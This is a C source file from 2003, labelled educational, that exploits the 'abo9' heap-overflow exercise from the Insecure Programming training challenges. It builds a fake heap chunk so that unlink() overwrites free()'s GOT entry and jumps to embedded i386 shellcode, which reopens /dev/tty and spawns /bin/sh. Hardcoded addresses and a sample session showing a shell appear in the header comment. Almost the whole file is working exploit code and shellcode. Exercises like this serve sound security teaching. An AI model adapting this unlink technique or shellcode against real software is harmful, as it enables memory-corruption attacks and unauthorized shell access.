/*
 * $Id: abo9-ex.c,v 1.1.1.1 2003/10/15 17:27:57 raptor Exp $
 *
 * abo9-ex.c - abo9.c exploit, for educational purposes
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * See http://community.core-sdi.com/~gera/InsecureProgramming/
 * See also abo9+mod-ex.c for details about unlink() technique.
 *
 * $ ./abo9-ex | ./abo9
 * Using free() address: 0x804961C
 * Using ret: 0x8049648
 * sh-2.05a$ 
 *
 * This is the buffer structure (we don't put our shellcode in envp):
 * [SC] [Ax(256-strlen(SC)] [FAKE_SIZE] [FAKE_SIZE] [JUNK] [FREE] [ret]
 *
 * $ ltrace ./abo9 2>&1 | grep malloc
 * malloc(256)                                      = 0x08049648
 *                                                    ^^^^^^^^^^\__(ret)
 * malloc(256)                                      = 0x08049750
 *
 * $ objdump -R ./abo9 | grep free
 * 0804961c R_386_JUMP_SLOT   free
 * ^^^^^^^^\__(this is the free() address in GOT)
 *
 * NOTE: shellcode is modified, 'cause (retaddr + 8) is being written to
 * by unlink() and the content there will be destroyed. So we need to jump
 * at least 12 bytes ahead, over the destroyed content. Moreover, gets()
 * is a bit harder to exploit than strcpy(), 'cause our buffer must not
 * contain newline ('\x0a') or end-of-file characters. Finally, we need to
 * close and re-open stdin to execute /bin/sh correctly (gets() locks it).
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define JUNK		0xdeadbeef	// size field of fake chunk
#define	FAKE_SIZE	0xfffffffc	// -4 (PREV_INUSE = 0)
#define BUF		277		// 256 + (4 * 5) + 1
#define FREE		0x0804961c	// free() address in GOT
#define	RET		0x08049648	// address of pfbuf1

char sc[] = /* linux/i386 shellcode (13 + 8 + 23 + 24  = 68 bytes) */
/* jmp 11 ('\x0a' is '\n') */
"\xeb\x0bWHO_CARES??"
/* close(0) */
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
/* open("/dev/tty", O_RDWR | ...) */
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
/* execve("/bin/sh", ["/bin/sh"], NULL) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char *argv[])
{
	char buf[BUF];
	int i, free_addr = FREE, ret = RET;

	/* address pointer */
	char *ap = buf;

	fprintf(stderr, "Using free() address: 0x%X\n", free_addr);
	fprintf(stderr, "Using ret: 0x%X\n", ret);

	/* pad the buffer, filling the first chunk */
	memset(ap, 'A', 256);
	ap += 256;

	/* prev_size field of second chunk */
	*((void **)ap) = (void *)(FAKE_SIZE);
	ap += 4;

	/* size field of second chunk (prev_size field of fake chunk) */
	*((void **)ap) = (void *)(FAKE_SIZE);
	ap += 4;

	/* size field of fake chunk */
	*((void **)ap) = (void *)(JUNK);
	ap += 4;

	/* fd field of second chunk (see solar designer's netscape exploit) */
	*((void **)ap) = (void *)(free_addr - 12);
	ap += 4;

	/* bk field of second chunk (see solar designer's netscape exploit) */
	*((void **)ap) = (void *)(ret);
	ap += 4;

	/* terminate our buffer */
	*ap = 0x0;

	/* put the shellcode at pbuf1 address */
	for (i = 0; i < strlen(sc); i++)
		buf[i] = sc[i];

	/* output the evil string */
	printf("%s", buf);
}
